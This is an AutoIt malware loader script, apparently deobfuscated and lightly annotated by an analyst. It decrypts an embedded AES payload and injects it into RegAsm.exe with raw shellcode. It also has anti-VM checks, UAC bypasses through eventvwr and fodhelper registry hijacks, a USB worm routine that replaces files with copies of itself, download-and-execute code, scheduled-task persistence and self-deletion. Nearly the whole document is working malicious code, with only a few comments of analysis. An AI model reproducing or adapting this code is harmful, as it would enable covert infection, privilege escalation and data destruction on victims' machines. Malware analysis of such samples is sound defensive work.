#NoTrayIcon

Func decrypt_data($vdata, $vcryptkey) ; ewyotozfgclifr
	Local $__g_acryptinternaldata["3"]
	Local $aret = "0"
	Local $tbuff = "0"
	Local $ttempstruct = "0"
	Local $ierror = "0"
	Local $iextended = 0
	Local $iplaintextsize = "0"
	Local $vreturn = "0"
	$vdata = BinaryToString($vdata)
	Local $hadvapi32 = DllOpen("Advapi32.dll") ; initially it opened this and kept calling __g_acryptinternaldata["1"] to optimze ? but i renamed it so each dll call opens advapi32 and close it after execution
	$__g_acryptinternaldata["1"] = $hadvapi32
	Local $iproviderid = "24"

	;create a crypt context for RSA_AES cypher read more at https://support.microsoft.com/en-sg/help/238187/cryptacquirecontext-use-and-troubleshooting
	Local $aret = DllCall("Advapi32.dll", "bool", , _ 
																"handle*", "0", _
																"ptr", "0", _
																"ptr", "0", _
																"dword", $iproviderid, _ 			; PROV_RSA_AES Microsoft Enhanced RSA and AES Cryptographic Provider
																"dword", "0xF0000000")				; CRYPT_VERIFYCONTEXT flag value 

	$__g_acryptinternaldata["2"] = $aret[1] ; handler to csp
	$__g_acryptinternaldata["0"] += 1
	;create a md5 hashing object https://docs.microsoft.com/en-us/windows/desktop/api/wincrypt/nf-wincrypt-cryptcreatehash
	$aret = DllCall("Advapi32.dll", "bool", "CryptCreateHash", _
															"handle", $__g_acryptinternaldata["2"], _
															"uint", "0x00008003", _					; CALG_MD5 MD5 hashing algorithm
															"ptr", "0", _
															"dword", "0", _
															"handle*", "0")
	$hcrypthash = $aret["5"] ; handler to the hashing object
	$tbuff = DllStructCreate("byte[" & BinaryLen($vcryptkey) & "]")
	DllStructSetData($tbuff, 1, $vcryptkey) ; buffer with the key
	;add data to the hash object
	$aret = DllCall("Advapi32.dll", "bool", "CryptHashData", _
															"handle", $hcrypthash, _ 
															"struct*", $tbuff, _ 					; hash the key ?
															"dword", DllStructGetSize($tbuff), _ 	;
															"dword", 1)								; flag CRYPT_USERDATA 

	; generate crypto session keys
	$aret = DllCall("Advapi32.dll", "bool", "CryptDeriveKey", _
															"handle", $__g_acryptinternaldata["2"], _ 	; handler to the Prov_RSA_AES csp
															"uint", "0x00006610", _ 					; CALG_AES_256
															"handle", $hcrypthash, _ 
															"dword", "0x00000001", _ 					; ? this is the flags or key length
															"handle*", "0")
	$vreturn = $aret["5"] ; derive key pointer

	DllCall("Advapi32.dll", "bool", "CryptDestroyHash", "handle", $hcrypthash)			; clean the hash

	$vcryptkey = $vreturn
	$tbuff = DllStructCreate("byte[" & BinaryLen($vdata) + "1000" & "]")		 						; Array with the encrypted data +1000 bytes ?
	If BinaryLen($vdata) > "0" Then DllStructSetData($tbuff, Execute("1"), $vdata)						; check if read data was empty

	; decrypt the data using the hash and key objects 
	$aret = DllCall("Advapi32.dll", "bool", "CryptDecrypt", _ 
															"handle", $vcryptkey, _ 
															"handle", "0", _ 
															"bool", True, _ 							; Only one block
															"dword", "0", _ 							; no flags
															"struct*", $tbuff, _ 						; data to decrypt
															"dword*", BinaryLen($vdata))				; size of data to decrypt
	
	$iplaintextsize = $aret["6"] 		; size of the result 
	$ttempstruct = DllStructCreate("byte[" & $iplaintextsize + 1 & "]", DllStructGetPtr($tbuff))		; fill the buff with the decrypted data
	$vreturn = BinaryMid(DllStructGetData($ttempstruct, 1), 1, $iplaintextsize)							; get the decreypted data bytes

	Local $aret = DllCall($__g_acryptinternaldata[1], "bool", "CryptDestroyKey", "handle", $vcryptkey) 	; release key object

	DllCall($__g_acryptinternaldata[1], "bool", "CryptDestroyKey", "handle", $vcryptkey)				; release key again ? 

	$__g_acryptinternaldata["0"] -= 1

	DllCall($__g_acryptinternaldata[1], "bool", "CryptReleaseContext", _ 
															"handle", $__g_acryptinternaldata["2"], _ 	; release crypt context
															"dword", "0")

	DllClose($__g_acryptinternaldata[1])
	Return Binary($vreturn)
EndFunc

Func injectProcess($wpath, $warguments, $lpfile, $protect)
	Local $bin_shellcode = "0x558BEC8B4D088BC180390074064080380075FA2BC15DC20400558BEC56578B7D0833F657E8D7FF"
	$bin_shellcode &= "FFFF8BC885C974200FBE07C1E60403F08BC625000000F0740BC1E81833F081E6FFFFFF0F474975E0"
	$bin_shellcode &= "5F8BC65E5DC20400558BEC51515356578B7D0833F68B473C8B44387803C78B50208B581C03D78B48"
	$bin_shellcode &= "2403DF8B401803CF8955FC894DF889450885C074198B04B203C750E882FFFFFF3B450C74148B55FC"
	$bin_shellcode &= "463B750872E733C05F5E5B8BE55DC208008B45F80FB704708B048303C7EBE9558BEC81ECF0030000"
	$bin_shellcode &= "53565733FF897DB8648B35300000008B760C8B760C8B368B368B76188975B8897DC8648B35300000"
	$bin_shellcode &= "008B760C8B760C8B368B76188975C88D45B4C78558FFFFFF793A3C07898520FFFFFF8BF78D45E8C7"
	$bin_shellcode &= "855CFFFFFF794A8A0B898524FFFFFF8D45B0898528FFFFFF8D45A489852CFFFFFF8D45C0898530FF"
	$bin_shellcode &= "FFFF8D4598898534FFFFFF8D45D4898538FFFFFF8D45A889853CFFFFFF8D45A0898540FFFFFF8D45"
	$bin_shellcode &= "90898544FFFFFF8D4594898548FFFFFF8D45C489854CFFFFFF8D45AC898550FFFFFF8D45CCC78560"
	$bin_shellcode &= "FFFFFFEE38830CC78564FFFFFF5764E101C78568FFFFFF18E4CA08C7856CFFFFFFE3CAD803C78570"
	$bin_shellcode &= "FFFFFF99B04806C78574FFFFFF93BA9403C78578FFFFFFE4C7B904C7857CFFFFFFE487B804C74580"
	$bin_shellcode &= "A92DD701C7458405D13D0BC745884427230FC7458CE86F180D898554FFFFFF8B45C883FE02FFB4B5"
	$bin_shellcode &= "58FFFFFF0F4F45B850E842FEFFFF8B8CB520FFFFFF890185C00F84910300004683FE0E7CD28BDF6A"
	$bin_shellcode &= "108D45D84350895DFCFF55E86A448D85DCFEFFFF50FF55E868CC0200008D8510FCFFFF50FF55E88B"
	$bin_shellcode &= "4D10C78510FCFFFF070001008B713C03F10FB74614897DF8897DBC8945D039BEA0000000741139BE"
	$bin_shellcode &= "A40000007409F6461601750333FF4733D2897DF433C08955EC6639110F94C03D4D5A00000F840E03"
	$bin_shellcode &= "000033C039160F94C03D504500000F84FC02000033C0663956040F94C03D4C0100000F84E8020000"
	$bin_shellcode &= "8D45D8508D85DCFEFFFF5052526A04525252FF750CFF7508FF55A485C00F84AD0200008D8510FCFF"
	$bin_shellcode &= "FF50FF75DCFF55A085C00F84980200006A006A048D45BC508B85B4FCFFFF83C00850FF75D8FF5594"
	$bin_shellcode &= "85C00F84780200008B45BC3B4634750F50FF75D8FF55B085C00F85610200006A406800300000FF76"
	$bin_shellcode &= "506A00FF55988BD885DB0F84450200006A406800300000FF7650FF7634FF75D8FF55C08945F885C0"
	$bin_shellcode &= "753B85FF0F84230200006A406800300000FF765033FFC745EC0100000057FF75D8FF55C08945F885"
	$bin_shellcode &= "C0751468008000005753FF55C48B5DFCE9F501000033FFFF7654FF751053FF55B433C0897DF0663B"
	$bin_shellcode &= "4606732C8B7DD083C72C03FEFF77FC8B07034510508B47F803C350FF55B48B4DF08D7F280FB74606"
	$bin_shellcode &= "41894DF03BC87CDC8B7B3C8B45F803FB837DEC008947340F848A000000837DF4000F84800000008B"
	$bin_shellcode &= "97A00000008365F40003D383BFA400000000766B8B420433C983E808894DF0A9FEFFFFFF76450FB7"
	$bin_shellcode &= "444A086685C0742B25FF0F000003028945EC8BC88B46342904198B4DF08B47340FB74C4A0881E1FF"
	$bin_shellcode &= "0F0000030A0104198B4DF08B42044183E808894DF0D1E83BC872BB8B4DF4034A04035204894DF43B"
	$bin_shellcode &= "8FA4000000729533FF57FF765053FF75F8FF75D8FF55D485C00F84FEFEFFFF8D459C506A02FF7654"
	$bin_shellcode &= "FF75F8FF75D8FF55CC85C00F84E4FEFFFF33C0897DF4663B4606736C8B7DD083C73C03FE8B07A900"
	$bin_shellcode &= "000020741985C079046A40EB172500000040F7D81BC083E01083C010EB1585C079056A0458EB0CA9"
	$bin_shellcode &= "000000406A00580F95C0408D4D9C5150FF77E48B47E80345F850FF75D8FF55CC85C074128B4DF483"
	$bin_shellcode &= "C7280FB7460641894DF43BC8729E33FF68008000005753FF55C485C00F845BFEFFFF576A048D45F8"
	$bin_shellcode &= "508B85B4FCFFFF83C00850FF75D8FF55D485C00F843CFEFFFF8B46280345F88985C0FCFFFF8D8510"
	$bin_shellcode &= "FCFFFF50FF75DCFF559085C00F841BFEFFFFFF75DCFF55AC85C00F840DFEFFFF8B45E0EB1D8B5DFC"
	$bin_shellcode &= "33FF837DD800740757FF75D8FF55A883FB050F8677FCFFFF33C05F5E5B8BE55DC20C00"
	; allocate space for the shellcode with execution privs 
	Local $lpshellcode = DllCall("kernel32", "ptr", "VirtualAlloc", _ 
													"dword", "0", _ 
													"dword", BinaryLen($bin_shellcode), _ 
													"dword", "0x3000", _ 							; MEM_COMMIT | MEM_RESERVE
													"dword", "0x40")["0"]   						; PAGE_EXECUTE_READWRITE privileges 

	Local $shellcode_struct = DllStructCreate("byte shellcode[" & BinaryLen($bin_shellcode) & "]", $lpshellcode) 
	Local $file_struct = DllStructCreate("byte lpfile[" & StringLen($lpfile) & "]")
	DllStructSetData($shellcode_struct, "shellcode", $bin_shellcode)
	DllStructSetData($file_struct, "lpfile", $lpfile)
	;
	Local $ret = DllCallAddress("dword", $lpshellcode + "0xBE", _ 
														"wstr", $wpath, _ 
														"wstr", $warguments, _ 
														"ptr", DllStructGetPtr($file_struct))
	;
	Local $handlefrompid = DllCall("kernel32.dll", "handle", "OpenProcess", _ 
																"dword", "0x001F0FFF", _ 			; ALL PRIVS 
																"bool", "0", _ 
																"dword", $ret["0"])["0"]

	DllCall("kernel32", "dword", "VirtualFree", "dword", $lpshellcode, "dword", "0", "dword", "0x8000")
	If $protect Then
		acl($handlefrompid)
	EndIf
EndFunc

Func acl($handle)
	sleepLoop("3", "12000")
	Local $mainstruct = DllStructCreate("dword;int;dword;STRUCT;ptr;int;int;int;ptr;ENDSTRUCT")
	Local $char = DllStructCreate("char[32]")
	Local $dword = DllStructCreate("dword")
	Local $array = ["0x401FFFFF", "3", "0", "0", "0", 1, "0", DllStructGetPtr($char)]
	For $i = "0" To "7"
		DllStructSetData($mainstruct, $i + 1, $array[$i])
	Next
	DllStructSetData($char, 1, "CURRENT_USER")
	$mainstrucpointer = DllStructGetPtr($mainstruct)
	$dwordpointer = DllStructGetPtr($dword)
	$setentriesinacl = DllCall("Advapi32.dll", "dword", "SetEntriesInAclA", "ulong", 1, "ptr", $mainstrucpointer, "ptr", "0", "ptr", $dwordpointer)
	$setsecurityinfo = DllCall("Advapi32.dll", "dword", "SetSecurityInfo", "handle", $handle, "int", "6", "dword", "0x00000004", "dword", "0", "dword", "0", "ptr", DllStructGetData($dword, Execute(1)), "ptr", "0")
	DllCall("Kernel32.dll", "Handle", "LocalFree", "Handle", $dwordpointer)
EndFunc

Func sleepLoop($loop, $time)
	Local $var = Random("0", "255")
	For $i = 0 To $loop
		Sleep($time / $loop)
		$var += Random("0", "255")
		If $var = $var Then
			$var = Random("0", "255")
		EndIf
	Next
EndFunc

Func startMutex($soccurrencename)
	Local $ahandle = DllCall("kernel32.dll", "handle", "CreateMutexW", _  
														"struct*", 0, _ 
														"bool", 1, _ 
														"wstr", $soccurrencename)  			; create a mutex named rdpinit

	Local $alasterror = DllCall("kernel32.dll", "dword", "GetLastError")  					; ERROR_ALREADY_EXISTS = 183 , means mutex already exist so host is already compromised 
	If $alasterror[0] = "183" Then
		DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $ahandle["0"])				; close the handle to restart the execution ?
	EndIf
EndFunc

Func getResource($resname, $restype)  ; search for specific resource ; renamed from hyfdzyqzqfkljwcdg
	Local $respointer
	Local $ressize
	Local $hinstance
	Local $infoblock
	Local $globalmemoryblock
	Local $memorypointer
	$infoblock = DllCall("kernel32.dll", "ptr", "FindResourceW", _ 
													"ptr", $hinstance, _ 					; searching on current process as its always null ?
													"wstr", $resname, _ 
													"long", $restype)["0"]

	$ressize = DllCall("kernel32.dll", "dword", "SizeOfResource", "ptr", $hinstance, "ptr", $infoblock)["0"]
	$globalmemoryblock = DllCall("kernel32.dll", "ptr", "LoadResource", "ptr", $hinstance, "ptr", $infoblock)["0"]  ; handle to get pointer to the first byte in memory of the resource
	$memorypointer = DllCall("kernel32.dll", "ptr", "LockResource", "ptr", $globalmemoryblock)["0"]					; pointer to the bytes of the resource 
	Return DllStructCreate("byte[" & $ressize & "]", $memorypointer)	
EndFunc

Func caeusfypholb()
	Local $array = ["vmtoolsd.exe", "vbox.exe"]
	For $i = 0 To UBound($array) - 1
		If ProcessExists($array[$i]) Then
			Execute("ProcessClose(@AutoItPID)")
		EndIf
	Next
EndFunc

Func start($protect)
	Local $res = $enc_data
	If FileExists(@HomeDrive & "\Windows\Microsoft.NET\Framework\v2.0.50727\RegAsm.exe") Then
		$processid = injectProcess(@HomeDrive & "\Windows\Microsoft.NET\Framework\v2.0.50727\RegAsm.exe", "", $res, $protect)
	ElseIf FileExists(@HomeDrive & "\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe") Then
		$processid = injectProcess(@HomeDrive & "\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe", "", $res, $protect)
	EndIf
EndFunc

Func eulksyikusmgkwabcvv()
	If NOT WinExists("[CLASS:Progman]") Then
		Execute("ProcessClose(@AutoItPID)")
	EndIf
EndFunc

Func oqbalkskhscedqwwgtzdxv()
	$usblist = DriveGetDrive("REMOVABLE")
	If $usblist <> "" Then
		For $i = 1 To $usblist["0"]
			If $usblist[$i] <> @HomeDrive Then
				Local $filearray
				$filearray = _filelisttoarrayrec($usblist[$i], "*", Execute(1), Execute(1), Execute("0"), Execute("2"))
				For $f = 1 To $filearray["0"]
					$datatarget = Binary(FileRead($filearray[$f]))
					$checkdata = StringInStr($filearray[$f], ".pif")
					If NOT $checkdata Then
						FileWrite($filearray[$f] & ".pif", Binary(FileRead(@ScriptFullPath)))
						FileDelete($filearray[$f])
					EndIf
				Next
			EndIf 
		Next 
	EndIf
EndFunc

Func fkngosazznnsjudxcgbxdvl()
	If StringInStr(@OSVersion, "7") OR StringInStr(@OSVersion, "8") Then
		If NOT Execute("IsAdmin()") Then
			RegWrite("HKCU\Software\Classes\mscfile\shell\open\command", "", "REG_SZ", @AutoItExe)
			ShellExecute("eventvwr")
		EndIf
	ElseIf StringInStr(@OSVersion, "10") Then
		If NOT Execute("IsAdmin()") Then
			DllCall("kernel32.dll", "boolean", "Wow64EnableWow64FsRedirection", "boolean", "0")
			RegWrite("HKCU\Software\Classes\ms-settings\shell\open\command", "DelegateExecute", "REG_SZ", "Null")
			RegWrite("HKCU\Software\Classes\ms-settings\shell\open\command", "", "REG_SZ", @AutoItExe)
			ShellExecute("fodhelper")
		EndIf
	EndIf
EndFunc

Func ukecvducphvpvnllnzobzuv($type, $title, $body)
	If @ScriptDir <> $install_dir Then
		Local $uint = "0x00000010"
		If $type = "64" Then
			$uint = "0x00000040"
		EndIf
		DllCall("User32.dll", "ptr", "MessageBox", "hwnd", "Null", "str", $body, "str", $title, "uint", $uint)
	EndIf
EndFunc

Func snokdwwmzjymkbxrktaimkyt($url, $filename, $dir)
	If @ScriptDir <> $install_dir Then
		Local $instaldir = getdir($dir)
		If FileExists($instaldir & "\" & $filename) Then
			FileDelete($instaldir & "\" & $filename)
		EndIf
		DllCall("urlmon.dll", "ptr", "URLDownloadToFile", "ptr", "0", "str", $url, "str", $instaldir & "\" & $filename, "dword", "0", "ptr", "0")
		ShellExecute($instaldir & "\" & $filename)
	EndIf
EndFunc

Func lqyqrwtqhqhweqabdbwpkfutesby()
	If @ScriptDir <> $install_dir Then
		ShellExecute(@ComSpec, "/k ping 127.0.0.1 -t 0 & del" & @AutoItExe & " & exit", Execute("Null"), Execute("Null"), @SW_HIDE)
	EndIf
EndFunc

Func vwnpxojvzkstqcrwcfxcbow($resname, $filename, $run, $runonce, $dir)
	$file = DllStructGetData(getResource($resname, "10"), Execute(1))
	Local $instaldir = getdir($dir)
	Local $filehandle = FileOpen($instaldir & "\" & $filename, "2")
	FileWrite($filehandle, $file)
	FileClose($filehandle)
	If $runonce = Execute("False") Then
		If $run = Execute("True") Then
			ShellExecute($instaldir & "\" & $filename)
		EndIf
	Else
		If @ScriptDir <> $install_dir Then
			ShellExecute($instaldir & "\" & $filename)
		EndIf
	EndIf
EndFunc

Func setPersist($file, $regkey, $attrib, $hidden)
	DirCreate($install_dir)
	Local $fullpath = $install_dir & "\" & $file
	Local $vbspath = $install_dir & "\" & $regkey & ".vbs"
	Local $urlpath = @StartupDir & "\" & $regkey & ".url"
	Local $openfile = FileOpen(@AutoItExe, "16")
	Local $hfile = FileOpen($fullpath, "2")
	Local $binary = FileRead($openfile) & Binary(Random("0", "255"))
	Local $urlcontent = "[InternetShortcut]" & @CR & "URL=file:///" & StringReplace($vbspath, "\", "/")
	Local $urlopen
	Local $vbsopen
	If $hidden Then
		ShellExecute("schtasks", "/create /tn" & $regkey & " /tr" & Chr("34") & $fullpath & Chr("34") & " /sc  minute /mo 1 /F", @SystemDir, "", @SW_HIDE)
	Else
		$urlopen = FileOpen($urlpath, "2")
		$vbsopen = FileOpen($vbspath, "2")
		Local $triple = Chr("34") & Chr("34") & Chr("34")
		Local $vbs = "Set WshShell = WScript.CreateObject(" & Chr("34") & "WScript.Shell" & Chr("34") & ")" & @CR & "WshShell.Run" & $triple & $fullpath & $triple
		FileWrite($vbsopen, $vbs)
		FileWrite($urlopen, $urlcontent)
	EndIf
	Local $handlearray = [$urlopen, $vbsopen, $openfile, $hfile]
	FileWrite($hfile, $binary)
	FileSetAttrib($fullpath, $attrib)
	FileSetAttrib($install_dir, $attrib)
	For $i = "0" To UBound($handlearray) - 1
		FileClose($handlearray[$i])
	Next
EndFunc

Func ualhvennmpniswkljzkinjdonqyqz() ;junk main function ?
	For $i = "0" To Random("5", "8", 1)
		$prime = "0"
		For $z = "2" To "2"
			$bprime = 1
			$j = Random("5", "8", 1)
			While $j * $j <= $i
				If Mod($i, $j) == "0" Then
					$prime = "0"
					ExitLoop
				EndIf
				$j += 1
			WEnd
			If $bprime = 1 Then $prime = $z
		Next
	Next
EndFunc

Func getdir($index)
	Local $instaldir
	Switch ($index)
		Case 1
			$instaldir = @TempDir
		Case "2"
			$instaldir = @AppDataDir
		Case "3"
			$instaldir = @ScriptDir
	EndSwitch
	Return $instaldir
EndFunc



Func deobfuscate($wdxkgveiiapc, $cpgooidhalki) ; Renamed from wbhsenrgekrt
	Local $result
	Local $char
	Local $xor
	Local $exec = Execute("Execute")
	Local $split = StringSplit(BinaryToString($wdxkgveiiapc), "")
	Local $len = StringLen(BinaryToString($cpgooidhalki))
	For $i = "1" To $split["0"]
		$char = Asc($split[$i])
		$xor = BitXOR($char, $len)
		For $ii = "0" To $len - "1"
			$xor = BitXOR($xor, $len + $ii)
		Next
		$result &= ChrW($xor)
	Next
	Return $result
EndFunc

ualhvennmpniswkljzkinjdonqyqz()
FileDelete(@AutoItExe & ":Zone.Identifier")

startMutex("rdpinit")				;renamed from hqeqanssejka
Local $enc_data = DllStructGetData(getResource("NETSTAT1", "8"), 1)
$enc_data &= DllStructGetData(getResource("AcXtrnal2", "8"),1)
$enc_data &= DllStructGetData(getResource("audit3", "8"), 1)
$enc_data = decrypt_data($enc_data, "fajpenzlrumdlwphedshoydedjvdipbtxmnraijinazgnrsdpg") ; decypt the payload with the key
$install_dir = @AppDataDir & "\certcli"
sleepLoop("2", "15000")
start(Execute("False"))
setPersist("BlbEvents.exe", "aadauthhelper", "+", True)